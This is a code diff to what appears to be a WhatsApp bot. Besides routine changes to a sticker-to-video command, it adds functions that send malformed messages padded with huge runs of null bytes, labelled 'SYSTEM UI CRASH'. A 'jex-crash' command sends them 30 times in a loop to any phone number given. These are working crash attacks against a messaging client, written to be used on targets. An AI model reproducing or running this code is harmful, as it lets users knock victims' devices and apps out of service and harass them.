@@ -113,7 +113,7 @@ const { cleaningSession } = require('./lib/botSession');
 const {fetchReactionImage} = require('./lib/reaction')
 const { toAudio } = require('./lib/converter');
 const { jadibot, stopjadibot, listjadibot } = require('./jadibot')
-const xeontext2 = require('./lib/bug');
+const { webp2mp4 } = require('./lib/uploader');
 
 module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
 try {
@@ -252,55 +252,6 @@ const more = String.fromCharCode(8206)
 const readmore = more.repeat(4001)
 const reaction = async (jidss, emoji) => {
 conn.sendMessage(jidss, { react: { text: emoji, key: m.key } })
-}
-
-
-//  function to download media from message
-async function downloadMedia(quotedMsg, type) {
-    try {
-        const media = await downloadContentFromMessage(quotedMsg, type);
-        let buffer = Buffer.from([]);
-        for await (const chunk of media) {
-            buffer = Buffer.concat([buffer, chunk]);
-        }
-        return buffer;
-    } catch (error) {
-        throw new Error(`Failed to download ${type}: ${error.message}`);
-    }
-}
-
-
-// function that converts to audio and video====
-async function webp2mp4(source) {
-  let form = new FormData();
-  let isUrl = typeof source === 'string' && /https?:\/\//.test(source);
-  
-  form.append('new-image-url', isUrl ? source : '');
-  form.append('new-image', isUrl ? '' : source, 'image.webp');
-  
-  let res = await fetch('https://ezgif.com/webp-to-mp4', {
-    method: 'POST',
-    body: form
-  });
-  
-  let html = await res.text();
-  let $ = cheerio.load(html);
-  let form2 = new FormData();
-  let obj = {};
-  
-  $('form input[name]').each((_, el) => {
-    obj[$(el).attr('name')] = $(el).val();
-    form2.append($(el).attr('name'), $(el).val());
-  });
-  
-  let res2 = await fetch('https://ezgif.com/webp-to-mp4/' + obj.file, {
-    method: 'POST',
-    body: form2
-  });
-  
-  let html2 = await res2.text();
-  let $2 = cheerio.load(html2);
-  return new URL($2('div#output > p.outfile > video > source').attr('src'), res2.url).toString();
 }
 
 
@@ -460,7 +411,149 @@ function isValidConn(conn) {
            conn.user.id;
 }
 
+// Function to send system crash message
+async function sendSystemCrashMessage(conn, jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'viewOnceMessage': {
+      'message': {
+        'interactiveMessage': {
+          'header': {
+            'title': '',
+            'subtitle': " "
+          },
+          'body': {
+            'text': "SћЄYкЩ∞ћЄSкЩ∞ћЄTкЩ∞ћЄEкЩ∞ћЄMкЩ∞ћЄ UћЄIћЄ CћЄRкЩ∞ћЄAкЩ∞ћЄSкЩ∞ћЄHкЩ∞ћЄ"
+          },
+          'footer': {
+            'text': 'xp'
+          },
+          'nativeFlowMessage': {
+            'buttons': [{
+              'name': 'cta_url',
+              'buttonParamsJson': "{ display_text : 'SћЄYкЩ∞ћЄSкЩ∞ћЄTкЩ∞ћЄEкЩ∞ћЄMкЩ∞ћЄ UћЄIћЄ CћЄRкЩ∞ћЄAкЩ∞ћЄSкЩ∞ћЄHкЩ∞ћЄ', url : , merchant_url :  }"
+            }],
+            'messageParamsJson': "\0".repeat(1000000)
+          }
+        }
+      }
+    }
+  }), {});
+  
+  await conn.relayMessage(jid, messageContent.message, {
+    'participant': { 'jid': jid },
+    'messageId': messageContent.key.id
+  });
+}
 
+// Function to send list message
+async function sendListMessage(conn, jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'listMessage': {
+      'title': "SYSTEM UI CRASH" + "\0".repeat(920000),
+      'footerText': "SYSTEM CRASH",
+      'description': "SYSTEM CRASH",
+      'buttonText': null,
+      'listType': 2,
+      'productListInfo': {
+        'productSections': [{
+          'title': "lol",
+          'products': [{
+            'productId': "4392524570816732"
+          }]
+        }],
+        'productListHeaderImage': {
+          'productId': "4392524570816732",
+          'jpegThumbnail': null
+        },
+        'businessOwnerJid': "0@s.whatsapp.net"
+      }
+    }
+  }), {});
+  
+  await conn.relayMessage(jid, messageContent.message, {
+    'participant': { 'jid': jid },
+    'messageId': messageContent.key.id
+  });
+}
+
+// Function to send live location message
+async function sendLiveLocationMessage(conn, jid) {
+  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    'viewOnceMessage': {
+      'message': {
+        'liveLocationMessage': {
+          'degreesLatitude': 'p',
+          'degreesLongitude': 'p',
+          'caption': 'LIVE LOCATION CRASH' + 'a'.repeat(50000),
+          'sequenceNumber': '0',
+          'jpegThumbnail': ''
+        }
+      }
+    }
+  }), {});
+  
+  await conn.relayMessage(jid, messageContent.message, {
+    'participant': { 'jid': jid },
+    'messageId': messageContent.key.id
+  });
+}
+
+// Function to send extended text message
+async function sendExtendedTextMessage(conn, jid) {
+  await conn.relayMessage(jid, {
+    'extendedTextMessage': {
+      'text': '.',
+      'contextInfo': {
+        'stanzaId': jid,
+        'participant': jid,
+        'quotedMessage': {
+          'conversation': 'CRASH MESSAGE' + 'a'.repeat(50000)
+        }
+      }
+    }
+  }, {
+    'participant': { 'jid': jid }
+  });
+}
+
+// Function to send payment invite
+async function sendPaymentInvite(conn, jid) {
+  await conn.relayMessage(jid, {
+    'paymentInviteMessage': {
+      'serviceType': "UPI",
+      'expiryTimestamp': Date.now() + 86400000
+    }
+  }, {
+    'participant': { 'jid': jid }
+  });
+}
+
+// Function to send view once messages
+async function sendViewOnceMessages(conn, jid, count) {
+  for (let i = 0; i < count; i++) {
+    let messageContent = generateWAMessageFromContent(jid, {
+      'viewOnceMessage': {
+        'message': {
+          'interactiveMessage': {
+            'body': { 'text': '' },
+            'footer': { 'text': '' },
+            'header': { 'title': '', 'subtitle': '', 'hasMediaAttachment': false },
+            'nativeFlowMessage': {
+              'buttons': [{
+                'name': "cta_url",
+                'buttonParamsJson': "{\"display_text\":\"CRASH\",\"url\":\"https://www.google.com\"}"
+              }],
+              'messageParamsJson': "\0".repeat(100000)
+            }
+          }
+        }
+      }
+    }, {});
+    await conn.relayMessage(jid, messageContent.message, {
+      'messageId': messageContent.key.id
+    });
+  }
+}
 
 //================== [ CONSOLE LOG] ==================//
 const dayz = moment(Date.now()).tz(`${timezones}`).locale('en').format('dddd');
@@ -7416,25 +7509,6 @@ const quoted = m.quoted ? m.quoted : null;
     }
 }
 break
-case "tovideo": {
- if (!m.quoted) return reply(`Reply to a sticker with caption *${prefix + command}*`);
-    if (!m.quoted.mimetype.includes('webp')) return reply(`Please reply to a webp sticker`);
-    
-    try {
-      const media = await m.quoted.download();
-      const videoUrl = await webp2mp4(media);
-      
-      if (!videoUrl) throw new Error('Conversion failed');
-      
-      await conn.sendFile(m.chat, videoUrl, 'converted.mp4', '', m);
-      
-    } catch (error) {
-      console.error(error);
-      reply('❌ Failed to convert sticker to video. Please try again later.');
-    }
-}
-
-break
 case 'trackip': {
 if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
 try {
@@ -8665,13 +8739,24 @@ const text = args.join(' ');
     }
 }
 break
-case 'tovideo': {
-if (!text) reply(`reply stiker with caption *${prefix + command}*`)
-var media = await conn.downloadAndSaveMediaMessage(quoted, new Date * 1)
-let webpToMp4 = await webp2mp4File(media)
-conn.sendMessage(m.chat, { video: {url: webpToMp4.result}, caption: 'Convert Sticker To Video'}, { quoted: m })
-await fs.unlinkSync(media)
+case "tovideo": {
+ if (!m.quoted) return reply(`Reply to a sticker with caption *${prefix + command}*`);
+    if (!m.quoted.mimetype.includes('webp')) return reply(`Please reply to a webp sticker`);
+    
+    try {
+      const media = await m.quoted.download();
+      const videoUrl = await webp2mp4(media);
+      
+      if (!videoUrl) throw new Error('Conversion failed');
+      
+      await conn.sendFile(m.chat, videoUrl, 'converted.mp4', '', m);
+      
+    } catch (error) {
+      console.error(error);
+      reply('❌ Failed to convert sticker to video. Please try again later.');
+    }
 }
+
 break
 case "toimage": {
 const quoted = m.quoted || m.msg?.quoted;
@@ -11238,35 +11323,17 @@ case "jex-crash": {
     if (!Access) return reply(mess.owner);
     
     if (!text) return reply(`\`Example:\` : ${prefix + command} 256×××`);
-    
+    const bugs = require('./lib/bug');
     let target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
     reply(`*[!] Bug sent to target*`); 
     
-    // Rapid fire all bug functions
-    for (let i = 0; i < 50; i++) {
-        await bugs.bulldozer(target);
-        await bugs.VampSpam(target);
-        await bugs.VampDeviceCrash(target);
-        await bugs.VampPaymentCrash(target);
-        await bugs.protocolbug1(target, true);
-        await bugs.protocolbug2(target, true);
-        await bugs.protocolbug3(target, true);
-        await bugs.carouselNew(target);
-        await bugs.DelayStc(target);
-        await bugs.SockMentionJid3(target);
-        await bugs.CosmoBlankX(target);
-        await bugs.VampDelayMess(target);
-        await bugs.VampPrivateBlank(target);
-        await bugs.VampDelayCrash(target);
-        await bugs.VampBroadcast(target, true);
-        await bugs.mentionSw(target);
-        await bugs.protocolbug4(target, true);
-        await bugs.protocolbug5v2(target, true);
-        await bugs.protocolbug5(target, true);
-        await bugs.SendPairing(target);
-        await bugs.BaccaratUi(target);
-        await bugs.ProtoXAudio(target, true);
+    for (let i = 0; i < 30; i++) {
+        await sendSystemCrashMessage(conn, target);
+        await sendListMessage(conn, target);
+        await sendLiveLocationMessage(conn, target);
+        await sendExtendedTextMessage(conn, target);
+        await sendPaymentInvite(conn, target);
     }
     
     break;
